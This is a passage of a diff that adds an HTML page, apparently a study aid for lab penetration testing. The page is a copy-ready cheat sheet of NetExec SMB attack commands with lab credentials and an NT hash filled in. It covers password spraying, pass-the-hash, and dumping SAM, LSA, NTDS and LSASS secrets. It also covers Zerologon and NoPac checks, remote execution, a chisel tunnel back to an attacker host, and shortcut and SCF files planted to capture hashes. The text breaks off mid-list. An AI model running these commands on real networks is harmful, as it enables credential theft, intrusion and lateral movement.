@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NXC Command Center v2.0</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Nunito:wght@600;700;800;900&family=VT323&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#04060f;--bg2:#070b18;--bg3:#0c1225;--bg4:#101830;
+  --border:rgba(0,240,255,.12);--border2:rgba(0,240,255,.28);
+  --text:#c8e8ff;--text2:#6fa8cc;--text3:#3a6a88;
+  --accent:#00f0ff;--accent2:#00d4f0;
+  --green:#00ff88;--red:#ff2d6f;--orange:#ff8c20;--orange2:#ffaa40;
+  --purple:#b347ff;--teal:#00e5b0;--pink:#ff2d8f;--code:#80d8ff;
+  --shadow:0 8px 48px rgba(0,0,0,.9);
+  --glow-c:0 0 18px rgba(0,240,255,.45);
+  --glow-p:0 0 18px rgba(179,71,255,.45);
+  --glow-g:0 0 18px rgba(0,255,136,.4);
+  --glow-r:0 0 18px rgba(255,45,111,.45);
+}
+body{
+  font-family:'Nunito',sans-serif;
+  font-size:14px;font-weight:600;background:var(--bg);
+  color:var(--text);height:100vh;overflow:hidden;
+  display:flex;flex-direction:column;
+}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:rgba(0,240,255,.3);border-radius:4px}
+
+.hdr{
+  background:rgba(4,6,15,.95);
+  backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(0,240,255,.25);
+  padding:0 14px;height:52px;
+  display:flex;align-items:center;gap:10px;flex-shrink:0;
+  z-index:100;
+  box-shadow:0 2px 30px rgba(0,0,0,.8);
+}
+.hdr-title{
+  font-family:'Orbitron',monospace;
+  font-size:16px;font-weight:900;letter-spacing:1.5px;
+  background:linear-gradient(135deg,#00f0ff,#b347ff,#ff2d8f);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  white-space:nowrap;
+}
+.hdr-badge{
+  font-family:'Orbitron',monospace;
+  font-size:10px;padding:2px 9px;border-radius:3px;
+  background:rgba(0,240,255,.08);
+  border:1px solid rgba(0,240,255,.4);
+  color:var(--accent);font-weight:700;letter-spacing:1px;
+}
+.search-wrap{flex:1;max-width:360px;position:relative}
+.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3)}
+#searchInput{
+  width:100%;padding:7px 12px 7px 30px;
+  background:rgba(0,240,255,.04);
+  border:1px solid rgba(0,240,255,.2);
+  border-radius:6px;color:var(--text);font-size:13px;
+  font-family:'Nunito',sans-serif;font-weight:700;
+  outline:none;transition:all .2s;
+}
+#searchInput:focus{
+  border-color:var(--accent);
+  box-shadow:0 0 0 2px rgba(0,240,255,.15);
+  background:rgba(0,240,255,.07);
+}
+.hdr-right{display:flex;align-items:center;gap:5px;margin-left:auto;flex-shrink:0}
+.hdr-btn{
+  padding:4px 9px;
+  background:rgba(0,240,255,.04);
+  border:1px solid rgba(0,240,255,.2);
+  border-radius:4px;
+  color:var(--text2);font-size:11px;cursor:pointer;
+  transition:all .15s;white-space:nowrap;
+  font-family:'Nunito',sans-serif;font-weight:700;
+  letter-spacing:.5px;text-transform:uppercase;
+}
+.hdr-btn:hover{
+  border-color:var(--accent);color:var(--accent);
+  background:rgba(0,240,255,.1);
+  box-shadow:var(--glow-c);
+}
+
+.vars-bar{
+  background:rgba(7,11,24,.95);
+  border-bottom:1px solid rgba(179,71,255,.2);
+  padding:8px 16px;display:flex;flex-wrap:wrap;gap:6px;
+  align-items:center;flex-shrink:0;
+}
+.vars-lbl{
+  font-family:'Orbitron',monospace;
+  font-size:9px;font-weight:700;text-transform:uppercase;
+  letter-spacing:1.5px;color:var(--purple);
+}
+.vg{display:flex;align-items:center;gap:4px}
+.vl{
+  font-family:'Nunito',sans-serif;
+  font-size:11px;color:var(--text3);white-space:nowrap;font-weight:800;
+  text-transform:uppercase;letter-spacing:.5px;
+}
+.vi{
+  font-family:'Nunito',sans-serif;font-size:13px;font-weight:700;
+  padding:3px 8px;border:1px solid rgba(179,71,255,.25);border-radius:4px;
+  background:rgba(179,71,255,.05);color:var(--purple);min-width:80px;
+  outline:none;transition:all .15s;
+}
+.vi:focus{
+  border-color:var(--purple);
+  box-shadow:0 0 0 2px rgba(179,71,255,.15);
+}
+
+.body{display:flex;flex:1;overflow:hidden;position:relative;z-index:1}
+
+.sidebar{
+  width:220px;min-width:220px;
+  background:rgba(7,11,24,.97);
+  border-right:1px solid rgba(0,240,255,.12);
+  overflow-y:auto;flex-shrink:0;
+  display:flex;flex-direction:column;
+}
+.sb-top{display:flex;align-items:center;justify-content:space-between;padding:8px 10px 4px;flex-shrink:0}
+.sb-label{
+  font-family:'Orbitron',monospace;
+  font-size:9px;font-weight:700;text-transform:uppercase;
+  letter-spacing:1.5px;color:var(--text3);
+}
+.sg{
+  font-family:'Orbitron',monospace;
+  font-size:9.5px;font-weight:700;text-transform:uppercase;
+  letter-spacing:1px;color:var(--purple);
+  padding:10px 12px 3px;white-space:nowrap;overflow:hidden;
+  border-top:1px solid rgba(179,71,255,.1);
+  margin-top:4px;
+}
+.sg:first-of-type{border-top:none;margin-top:0}
+.si{
+  padding:6px 12px;cursor:pointer;font-size:12px;
+  color:var(--text2);border-left:2px solid transparent;
+  transition:all .12s;display:flex;align-items:center;gap:6px;
+  font-family:'Nunito',sans-serif;font-weight:700;
+}
+.si:hover{
+  background:rgba(0,240,255,.06);color:var(--accent);
+}
+.si.on{
+  border-left-color:var(--accent);color:var(--accent);
+  background:rgba(0,240,255,.08);
+}
+.si .cnt{
+  margin-left:auto;font-size:9px;
+  background:rgba(0,240,255,.1);color:var(--accent);
+  padding:1px 6px;border-radius:3px;flex-shrink:0;
+  font-family:'Orbitron',monospace;
+  border:1px solid rgba(0,240,255,.2);
+}
+
+.main{flex:1;overflow-y:auto;padding:16px 20px;background:transparent}
+.sec{display:none}
+.sec.on{display:block}
+
+.sec-hdr{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:16px;padding-bottom:12px;
+  border-bottom:1px solid rgba(0,240,255,.15);
+  position:relative;
+}
+.sec-title{
+  font-family:'Orbitron',monospace;
+  font-size:16px;font-weight:700;
+  background:linear-gradient(135deg,var(--accent),var(--purple));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  letter-spacing:.5px;
+}
+.sec-cmds-badge{
+  font-family:'Orbitron',monospace;
+  font-size:8px;padding:3px 10px;border-radius:3px;
+  background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.2);
+  color:var(--accent);
+}
+.sec-export{
+  padding:4px 10px;font-size:9px;
+  border:1px solid rgba(0,229,176,.3);
+  border-radius:4px;cursor:pointer;
+  background:rgba(0,229,176,.05);
+  color:var(--teal);font-family:'Nunito',sans-serif;font-weight:600;
+  transition:all .15s;margin-left:auto;text-transform:uppercase;letter-spacing:.5px;
+}
+.sec-export:hover{border-color:var(--teal);box-shadow:var(--glow-g);background:rgba(0,229,176,.1)}
+
+.grp{margin-bottom:28px}
+.grp-title{
+  font-family:'Nunito',sans-serif;
+  font-size:12px;font-weight:800;text-transform:uppercase;
+  letter-spacing:1.2px;color:var(--text3);
+  padding:10px 14px;
+  border-bottom:1px solid rgba(0,240,255,.15);
+  margin-bottom:12px;
+  background:transparent;
+  display:flex;align-items:center;gap:6px;
+  cursor:pointer;user-select:none;transition:all .15s;
+}
+.grp-title:hover{
+  color:var(--accent);border-color:rgba(0,240,255,.2);
+  background:rgba(0,240,255,.06);
+}
+.grp-title .collapse-icon{margin-left:auto;font-size:9px;transition:transform .2s;flex-shrink:0;opacity:.6}
+.grp-title.collapsed .collapse-icon{transform:rotate(-90deg)}
+.grp-body.collapsed{display:none}
+
+.row{
+  display:flex;align-items:flex-start;gap:12px;
+  margin-bottom:8px;padding:13px 16px;
+  border:1px solid rgba(0,240,255,.12);border-radius:6px;
+  background:rgba(6,12,28,.85);
+  transition:all .15s;
+  position:relative;border-left:3px solid transparent;
+}
+.row:hover{
+  border-color:rgba(0,240,255,.25);
+  background:rgba(0,240,255,.04);
+}
+.row.fav-row{border-left-color:var(--orange);box-shadow:inset 3px 0 10px rgba(255,140,32,.15)}
+.row.done-row{opacity:.35;border-left-color:var(--green) !important}
+.row.tag-crit-row{border-left-color:var(--red)}
+.row.tag-high-row{border-left-color:var(--orange)}
+.row.tag-med-row{border-left-color:var(--green)}
+.row.tag-osep-row{border-left-color:var(--purple)}
+
+.ri{flex:1;min-width:0}
+.rd{
+  font-size:12.5px;color:#8ec8e8;
+  margin-bottom:7px;display:flex;align-items:center;gap:6px;
+  flex-wrap:wrap;font-family:'Nunito',sans-serif;font-weight:700;
+}
+.tag{
+  font-family:'Orbitron',monospace;font-size:9px;padding:2px 7px;border-radius:3px;font-weight:700;letter-spacing:.8px;
+}
+.tag-crit{background:rgba(255,45,111,.12);color:var(--red);border:1px solid rgba(255,45,111,.4)}
+.tag-high{background:rgba(255,140,32,.1);color:var(--orange2);border:1px solid rgba(255,140,32,.35)}
+.tag-med{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.3)}
+.tag-osep{background:rgba(179,71,255,.12);color:var(--purple);border:1px solid rgba(179,71,255,.4)}
+.tag-new{background:rgba(0,240,255,.1);color:var(--accent);border:1px solid rgba(0,240,255,.3)}
+.tag-example{background:rgba(255,215,0,.1);color:#ffd700;border:1px solid rgba(255,215,0,.3)}
+
+.rc{
+  font-family:'Courier New',Consolas,monospace;
+  font-size:13px;line-height:1.75;
+  white-space:pre-wrap;word-break:break-all;
+  color:#c8f0ff;
+  background:rgba(0,10,24,.7);
+  border:1px solid rgba(0,240,255,.18);
+  border-left:3px solid rgba(0,240,255,.45);
+  border-radius:6px;
+  padding:10px 14px;
+  display:block;
+}
+.row-actions{display:flex;flex-direction:column;gap:5px;flex-shrink:0}
+.cp,.fav-btn,.done-btn{
+  padding:3px 9px;font-size:11px;
+  border:1px solid rgba(0,240,255,.15);border-radius:4px;
+  cursor:pointer;background:rgba(0,240,255,.04);
+  color:var(--text3);
+  font-family:'Nunito',sans-serif;font-weight:700;
+  letter-spacing:.5px;text-transform:uppercase;
+  transition:all .12s;white-space:nowrap;
+}
+.cp:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,240,255,.1)}
+.cp.ok{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.1)}
+.fav-btn:hover{border-color:var(--orange);color:var(--orange)}
+.fav-btn.on{color:var(--orange);border-color:var(--orange);background:rgba(255,140,32,.1)}
+.done-btn:hover{border-color:var(--green);color:var(--green)}
+.done-btn.on{color:var(--green);border-color:var(--green);background:rgba(0,255,136,.1)}
+
+#favPanel{
+  display:none;position:fixed;top:0;right:0;
+  width:450px;height:100vh;
+  background:rgba(7,11,24,.97);
+  border-left:1px solid rgba(255,140,32,.3);
+  z-index:200;overflow-y:auto;padding:18px;
+  box-shadow:-10px 0 50px rgba(255,140,32,.1);
+  backdrop-filter:blur(20px);
+}
+#favPanel.on{display:block}
+.fav-panel-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.fav-panel-title{
+  font-family:'Orbitron',monospace;
+  font-size:12px;font-weight:700;color:var(--orange2);
+}
+.close-btn{
+  padding:4px 10px;
+  background:rgba(255,45,111,.05);
+  border:1px solid rgba(255,45,111,.25);border-radius:4px;
+  color:var(--text2);cursor:pointer;
+  font-family:'Nunito',sans-serif;font-weight:600;font-size:10px;
+  text-transform:uppercase;letter-spacing:.5px;transition:all .15s;
+}
+.close-btn:hover{border-color:var(--red);color:var(--red)}
+
+#shortcutPanel{
+  display:none;position:fixed;top:60px;right:14px;width:290px;
+  background:rgba(7,11,24,.97);
+  border:1px solid rgba(0,240,255,.25);
+  border-radius:6px;z-index:300;
+  padding:14px 16px;
+  box-shadow:var(--shadow);
+  backdrop-filter:blur(20px);
+}
+#shortcutPanel.on{display:block}
+.sc-row{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:5px 0;border-bottom:1px solid rgba(0,240,255,.08);font-size:11px;
+  font-family:'Nunito',sans-serif;font-weight:600;
+}
+.sc-key{
+  font-family:'VT323','Courier New',monospace;
+  background:rgba(0,240,255,.08);
+  color:var(--accent);padding:2px 7px;border-radius:3px;
+  font-size:11px;border:1px solid rgba(0,240,255,.25);
+}
+.sc-desc{color:var(--text2)}
+.copy-toast{
+  position:fixed;bottom:70px;right:24px;
+  background:linear-gradient(135deg,rgba(0,255,136,.15),rgba(0,240,255,.15));
+  color:var(--green);
+  border:1px solid rgba(0,255,136,.4);
+  font-size:11px;font-weight:700;
+  padding:6px 16px;border-radius:20px;
+  z-index:1000;opacity:0;transform:translateY(6px);
+  transition:all .2s;pointer-events:none;
+  font-family:'Orbitron',monospace;
+}
+.copy-toast.show{opacity:1;transform:translateY(0)}
+.empty{text-align:center;padding:48px 20px;color:var(--text3);font-family:'Nunito',sans-serif}
+.empty-icon{font-size:36px;margin-bottom:10px;opacity:.5}
+.sr-count{font-size:12px;color:var(--text3);margin-bottom:12px}
+.sr-count span{color:var(--accent);font-weight:700}
+.hl{background:rgba(255,215,0,.18);color:#ffe580;border-radius:2px;padding:0 1px}
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <div class="hdr-title">⚡ NXC COMMAND CENTER</div>
+  <div class="hdr-badge">v2.0</div>
+  <div class="search-wrap">
+    <span class="search-icon">⌕</span>
+    <input id="searchInput" placeholder="search:// commands, modules, targets..." autocomplete="off">
+  </div>
+  <div class="hdr-right">
+    <button class="hdr-btn" onclick="toggleFav()">★ FAVS <span id="favCount">0</span></button>
+    <button class="hdr-btn" onclick="exportAll()">↓ EXPORT</button>
+    <button class="hdr-btn" onclick="toggleShortcuts()">⌨</button>
+  </div>
+</div>
+
+<div class="vars-bar">
+  <span class="vars-lbl">Variables</span>
+  <div class="vg"><span class="vl">TARGET</span><input class="vi" id="target" value="172.16.5.5" style="min-width:120px"></div>
+  <div class="vg"><span class="vl">USER</span><input class="vi" id="user" value="forend"></div>
+  <div class="vg"><span class="vl">PASS</span><input class="vi" id="pass" value="Klmcargo2" style="min-width:120px"></div>
+  <div class="vg"><span class="vl">HASH</span><input class="vi" id="hash" value="88ad09182de639ccc6579eb0849751cf" style="min-width:150px"></div>
+  <div class="vg"><span class="vl">LHOST</span><input class="vi" id="lhost" value="10.10.14.33"></div>
+  <div class="vg"><span class="vl">LPORT</span><input class="vi" id="lport" value="8080" style="min-width:55px"></div>
+  <div class="vg"><span class="vl">DOMAIN</span><input class="vi" id="domain" value="INLANEFREIGHT.LOCAL" style="min-width:120px"></div>
+  <div class="vg"><span class="vl">SHARE</span><input class="vi" id="share" value="Department Shares" style="min-width:120px"></div>
+</div>
+
+<div class="body">
+  <div class="sidebar" id="sidebar">
+    <div class="sb-top"><span class="sb-label">NXC MENU</span></div>
+  </div>
+  <div class="main" id="main">
+    <div id="searchResults"></div>
+    <div id="sections"></div>
+  </div>
+</div>
+
+<div id="favPanel">
+  <div class="fav-panel-hdr">
+    <div class="fav-panel-title">★ SAVED FAVORITES</div>
+    <button class="close-btn" onclick="toggleFav()">Close ✕</button>
+  </div>
+  <div id="favList"><div class="empty"><div class="empty-icon">☆</div>No favorites yet.</div></div>
+</div>
+
+<div id="shortcutPanel">
+  <div style="font-family:'Orbitron',monospace;font-size:10px;font-weight:700;color:var(--accent);margin-bottom:10px;">⌨ KEYBOARD SHORTCUTS</div>
+  <div class="sc-row"><span class="sc-desc">Focus search</span><kbd class="sc-key">Ctrl+K</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Clear search</span><kbd class="sc-key">Esc</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Next section</span><kbd class="sc-key">Ctrl+→</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Prev section</span><kbd class="sc-key">Ctrl+←</kbd></div>
+  <div class="sc-row"><span class="sc-desc">Toggle favorites</span><kbd class="sc-key">Ctrl+Shift+F</kbd></div>
+</div>
+
+<div class="copy-toast" id="copyToast">✓ COPIED TO CLIPBOARD</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// NXC DATA - Updated with Real-World Examples
+// ═══════════════════════════════════════════════════════════
+const D = [
+// ─── BASIC AUTHENTICATION ──────────────────────────────────
+{id:"basic",label:"Basic Auth",icon:"🔐",groups:[
+{t:"Password & Hash Auth",c:[
+["Basic password auth","nxc smb {TARGET} -u {USER} -p {PASS}"],
+["Basic auth with domain","nxc smb {TARGET} -d {DOMAIN} -u {USER} -p {PASS}"],
+["Local auth (no domain)","nxc smb {TARGET} --local-auth -u {USER} -p {PASS}"],
+["Pass-the-Hash","nxc smb {TARGET} -u administrator -H {HASH} --local-auth"],
+["Pass-the-Hash with grep","nxc smb {TARGET}/24 -u administrator -H {HASH} --local-auth | grep +"],
+["Null session (no creds)","nxc smb {TARGET} -u '' -p ''"],
+["Anonymous share enum","nxc smb {TARGET} -u '' -p '' --shares"],
+["Guest account","nxc smb {TARGET} -u guest -p '' --shares"],
+["Guest with guest password","nxc smb {TARGET} -u guest -p 'guest' --shares"],
+["Local auth with hash","nxc smb {TARGET} -u administrator -H {HASH} --local-auth"],
+]},
+{t:"Kerberos Auth",c:[
+["Kerberos with password","nxc smb {TARGET} -d {DOMAIN} -u {USER} -p {PASS} -k"],
+["Kerberos with AES key","nxc smb {TARGET} -u '' --aesKey AES_KEY_HERE"],
+["Kerberos from ccache","nxc smb {DC} --use-kcache --ntds"],
+["Kerberos shares","nxc smb {TARGET} -u '' -p '' --kerberos --shares"],
+["Generate TGT ticket","nxc smb {TARGET} -u '' -p '' --generate-tgt"],
+["Use ccache file","nxc smb {TARGET} --use-kcache --shares"],
+]},
+]},
+// ─── ENUMERATION ──────────────────────────────────────────
+{id:"enum",label:"Enumeration",icon:"🔍",groups:[
+{t:"User & Group Enum",c:[
+["Enumerate users","nxc smb {TARGET} --users"],
+["Enumerate users (null)","nxc smb {TARGET} -u '' -p '' --users"],
+["Export users to file","nxc smb {TARGET} -u '' -p '' --users-export users.txt"],
+["Enumerate users with auth","nxc smb {TARGET} -u {USER} -p {PASS} --users"],
+["RID brute force","nxc smb {TARGET} -u '' -p '' --rid-brute"],
+["Enumerate groups","nxc smb {TARGET} -u {USER} -p {PASS} --groups"],
+["Enumerate specific group","nxc smb {TARGET} -u {USER} -p {PASS} --groups Administrators"],
+["Enumerate local groups","nxc smb {TARGET} -u {USER} -p {PASS} --local-groups"],
+["Password policy","nxc smb {TARGET} -u {USER} -p {PASS} --pass-pol"],
+["Enumerate computers","nxc smb {TARGET} -u {USER} -p {PASS} --computers"],
+]},
+{t:"Share & File Enum",c:[
+["Enumerate shares","nxc smb {TARGET} -u {USER} -p {PASS} --shares"],
+["Enumerate shares (null)","nxc smb {TARGET} -u '' -p '' --shares"],
+["List directory","nxc smb {TARGET} -u {USER} -p {PASS} --dir C$"],
+["Enumerate disks","nxc smb {TARGET} -u {USER} -p {PASS} --disks"],
+["Spider share","nxc smb {TARGET} -u {USER} -p {PASS} --spider IT --pattern txt"],
+["Spider with regex","nxc smb {TARGET} -u {USER} -p {PASS} --spider IT --regex ."],
+["Spider with content search","nxc smb {TARGET} -u {USER} -p {PASS} --spider IT --content --regex Encrypt"],
+["Spider Plus module","nxc smb {TARGET} -u {USER} -p {PASS} -M spider_plus --share '{SHARE}'"],
+["Spider Plus options","nxc smb {TARGET} -u {USER} -p {PASS} -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false"],
+["Spider Plus help","nxc smb -M spider_plus --options"],
+]},
+{t:"Session & Logged-on",c:[
+["Logged-on users","nxc smb {TARGET} -u {USER} -p {PASS} --loggedon-users"],
+["Logged-on with filter","nxc smb {TARGET} -u {USER} -p {PASS} --loggedon-users --loggedon-users-filter julio"],
+["SMB sessions","nxc smb {TARGET} -u {USER} -p {PASS} --sessions"],
+["WMI query","nxc smb {TARGET} -u {USER} -p {PASS} --wmi-query 'SELECT * FROM Win32_Process'"],
+["WMI filter process","nxc smb {TARGET} -u {USER} -p {PASS} --wmi 'SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE \"%sysmon%\"'"],
+["WMI custom namespace","nxc smb {TARGET} -u {USER} -p {PASS} --wmi 'SELECT * FROM MSPower_DeviceEnable' --wmi-namespace 'root\\WMI'"],
+]},
+]},
+// ─── PASSWORD SPRAYING ────────────────────────────────────
+{id:"spray",label:"Password Spraying",icon:"💦",groups:[
+{t:"Spray Techniques",c:[
+["Single password - user list","nxc smb {TARGET} -u users.txt -p {PASS}"],
+["Single user - password list","nxc smb {TARGET} -u {USER} -p passwords.txt"],
+["Full spray","nxc smb {TARGET} -u users.txt -p passwords.txt"],
+["Specific users spray","nxc smb {TARGET} -u noemi david grace carlos -p Inlanefreight01!"],
+["Multiple passwords","nxc smb {TARGET} -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!"],
+["Continue on success","nxc smb {TARGET} -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success"],
+["Paired spray (no brute)","nxc smb {TARGET} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"],
+["Spray with grep","nxc smb {TARGET} -u users.txt -p {PASS} | grep +"],
+]},
+]},
+// ─── CREDENTIAL DUMPING ───────────────────────────────────
+{id:"dump",label:"Credential Dumping",icon:"💾",groups:[
+{t:"SAM, LSA, NTDS",c:[
+["Dump SAM hashes","nxc smb {TARGET} -u {USER} -p {PASS} --sam"],
+["Dump LSA secrets","nxc smb {TARGET} -u {USER} -p {PASS} --lsa"],
+["Dump NTDS.dit","nxc smb {DC} -u {USER} -p {PASS} --ntds"],
+["Dump NTDS with kerberos keys","nxc smb {DC} -u {USER} -p {PASS} --ntds --kerberos-keys"],
+["Dump NTDS from ccache","nxc smb {DC} --use-kcache --ntds"],
+["Dump NTDS specific user","nxc smb {DC} -u {USER} -p {PASS} --ntds --user krbtgt"],
+["Dump NTDS enabled only","nxc smb {DC} -u {USER} -p {PASS} --ntds --enabled"],
+["NTDS with ntdsutil","nxc smb {DC} -u {USER} -p {PASS} -M ntdsutil"],
+["Dump DPAPI secrets","nxc smb {TARGET} -u {USER} -p {PASS} --dpapi"],
+["LAPS authentication","nxc smb {DC} -u {USER} -p {PASS} --laps"],
+]},
+{t:"Dump Modules",c:[
+["lsassy module","nxc smb {TARGET} -u {USER} -p {PASS} -M lsassy"],
+["nanodump module","nxc smb {TARGET} -u {USER} -p {PASS} -M nanodump"],
+["procdump module","nxc smb {TARGET} -u {USER} -p {PASS} -M procdump"],
+["handlekatz module","nxc smb {TARGET} -u {USER} -p {PASS} -M handlekatz"],
+["GPP autologin","nxc smb {DC} -u {USER} -p {PASS} -M gpp_autologin"],
+["GPP password","nxc smb {DC} -u {USER} -p {PASS} -M gpp_password"],
+["Keepass discover","nxc smb {TARGET} -u {USER} -p {PASS} -M keepass_discover"],
+["Keepass trigger","nxc smb {TARGET} -u {USER} -p {PASS} -M keepass_trigger -o ACTION=ADD"],
+]},
+]},
+// ─── VULNERABILITY CHECKS ─────────────────────────────────
+{id:"vuln",label:"Vulnerability Checks",icon:"💀",groups:[
+{t:"Critical Vulnerabilities",c:[
+["Zerologon (CVE-2020-1472)","nxc smb {DC} -M Zerologon"],
+["PetitPotam check","nxc smb {DC} -M PetitPotam"],
+["NoPac (CVE-2021-42287)","nxc smb {DC} -u {USER} -p {PASS} -M nopac"],
+["DFScoerce","nxc smb {DC} -u {USER} -p {PASS} -M dfscoerce"],
+["ShadowCoerce","nxc smb {DC} -u {USER} -p {PASS} -M shadowcoerce --verbose"],
+["MS17-010 (EternalBlue)","nxc smb {TARGET} -M ms17-010"],
+]},
+]},
+// ─── FILE OPERATIONS ──────────────────────────────────────
+{id:"files",label:"File Operations",icon:"📁",groups:[
+{t:"Upload, Download, Execute",c:[
+["Upload file","nxc smb {TARGET} -u {USER} -p {PASS} --put-file SharpHound.exe SharpHound.exe"],
+["Upload with local auth","nxc smb {TARGET} -u {USER} -p {PASS} --put-file ./chisel.exe \\\\Windows\\Temp\\chisel.exe --local-auth"],
+["Download file","nxc smb {TARGET} -u {USER} -p {PASS} --get-file 20221109095424_BloodHound.zip bloodhound.zip"],
+["Download from share","nxc smb {TARGET} -u {USER} -p {PASS} --share IT --get-file Creds.txt Creds.txt"],
+["Upload to share","nxc smb {TARGET} -u {USER} -p {PASS} --share IT --put-file /etc/passwd passwd"],
+]},
+]},
+// ─── COMMAND EXECUTION ────────────────────────────────────
+{id:"exec",label:"Command Execution",icon:"⚡",groups:[
+{t:"Basic Execution",c:[
+["Execute CMD command","nxc smb {TARGET} -u {USER} -p {PASS} -x whoami"],
+["Execute with local auth","nxc smb {TARGET} -u {USER} -p {PASS} --local-auth -x whoami"],
+["Execute PowerShell","nxc smb {TARGET} -u {USER} -p {PASS} -X '$PSVersionTable'"],
+["Execute with SMBExec","nxc smb {TARGET} -u {USER} -p {PASS} --exec-method smbexec -x whoami"],
+["Execute with WMIExec","nxc smb {TARGET} -u {USER} -p {PASS} --exec-method wmiexec -X '$PSVersionTable'"],
+]},
+{t:"Real-World Executions",c:[
+["Run BloodHound","nxc smb {TARGET} -u {USER} -p {PASS} -x 'C:\\SharpHound.exe -c All && dir c:\\*_BloodHound.zip'"],
+["Run Chisel client","nxc smb {TARGET} -u {USER} -p {PASS} -x 'C:\\Windows\\Temp\\chisel.exe client {LHOST}:{LPORT} R:socks' --local-auth"],
+["Run Chisel server","nxc smb {TARGET} -u {USER} -p {PASS} -x 'C:\\Windows\\Temp\\chisel.exe server --socks5'"],
+["Read flag file","nxc smb {TARGET} -u {USER} -p {PASS} -x 'type C:\\users\\administrator\\desktop\\flag.txt'"],
+["Kill process","nxc smb {TARGET} -u {USER} -p {PASS} -X 'Stop-Process -Name chisel -Force'"],
+["List local admins","nxc smb {TARGET} -u {USER} -p {PASS} --local-auth -x 'net localgroup administrators'"],
+["Enable RDP registry","nxc smb {TARGET} -u {USER} -p {PASS} --local-auth -x 'reg add HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLICIES\\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'"],
+]},
+]},
+// ─── MODULES ──────────────────────────────────────────────
+{id:"modules",label:"Modules",icon:"🧩",groups:[
+{t:"Lateral Movement & Persistence",c:[
+["RDP enable","nxc smb {TARGET} -u {USER} -p {PASS} -M rdp -o ACTION=enable"],
+["RDP disable","nxc smb {TARGET} -u {USER} -p {PASS} -M rdp -o ACTION=disable"],
+["Slinky shortcuts","nxc smb {TARGET} -u {USER} -p {PASS} -M slinky -o SERVER={LHOST} NAME=important"],
+["Slinky with cleanup","nxc smb {TARGET} -u {USER} -p {PASS} -M slinky -o NAME=important CLEANUP=YES"],
+["Slinky options","nxc smb -M slinky --options"],
+["Drop SCF files","nxc smb {TARGET} -u {USER} -p {PASS} -M drop-sc -o URL=\\\\{LHOST}\\secret SHARE={SHARE} FILENAME=secret"],
+["Drop SCF cleanup","nxc smb {TARGET} -u {USER} -p {PASS} -M drop-sc -o CLEANUP=True FILENAME=secret"],
+["Drop SCF options","nxc smb -M drop-sc --options"],
+["Generate relay targets","nxc smb {TARGET}/24 --gen-relay-list relay.txt"],
+]},
+{t:"Credential & Loot Modules",c:[
+["bh_owned module","nxc smb -M bh_owned --options"],
+["bh_owned with password","nxc smb {TARGET} -u {USER} -p {PASS} -M bh_owned -o PASS=HackTheBoxCME!"],
+["WebDAV check","nxc smb {TARGET} -u {USER} -p {PASS} -M webdav"],
+["WebDAV with specific user","nxc smb {TARGET} -u plaintext$ -p password -M webdav"],
+]},
+]},
+// ─── RELAY & COERCION ─────────────────────────────────────
+{id:"relay",label:"Relay & Coercion",icon:"🔄",groups:[
+{t:"Relay Techniques",c:[
+["Generate relay targets","nxc smb {TARGET}/24 --gen-relay-list targets.txt"],
+["Generate relay with auth","nxc smb {TARGET}/24 -u anonymous -p '' --shares"],
+["Slinky with custom server","nxc smb {TARGET} -u anonymous -p '' -M slinky -o SERVER={LHOST} NAME=important"],
+["Slinky with port","nxc smb {TARGET} -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important"],
+["Drop SCF with HTTPS","nxc smb {TARGET} -u anonymous -p '' -M drop-sc -o URL=https://{LHOST}/testing SHARE=smb FILENAME=@secret"],
+["Drop SCF with Testing share","nxc smb {TARGET} -u anonymous -p '' -M drop-sc -o URL=https://{LHOST}/testing SHARE=Testing FILENAME=@secret"],
+]},
+]},
+// ─── ADVANCED ─────────────────────────────────────────────
+{id:"advanced",label:"Advanced",icon:"🚀",groups:[
+{t:"Network & Range",c:[
+["Scan whole subnet","nxc smb {TARGET}/24"],
+["Scan with specific users","nxc smb {TARGET}/24 -u {USER} -p {PASS}"],
+["Scan with null session","nxc smb {TARGET}/24"],
+["Scan with auth and grep","nxc smb {TARGET}/24 -u {USER} -p {PASS} | grep +"],
+]},
+{t:"Domain Context",c:[
+["Domain users with auth","nxc smb {DC} -u {USER} -p {PASS} --users"],
+["Domain with specific user","nxc smb {DC} -u {USER} -p {PASS} --users"],
+["Domain groups","nxc smb {DC} -u {USER} -p {PASS} --groups"],
+["Domain shares","nxc smb {DC} -u {USER} -p {PASS} --shares"],
+["Domain SPN scanning","nxc smb {DC} -u {USER} -p {PASS} --users"],
+]},
+{t:"Misc Commands",c:[
+["List modules","nxc smb -L"],
+["Module options","nxc smb -M MODULE --options"],
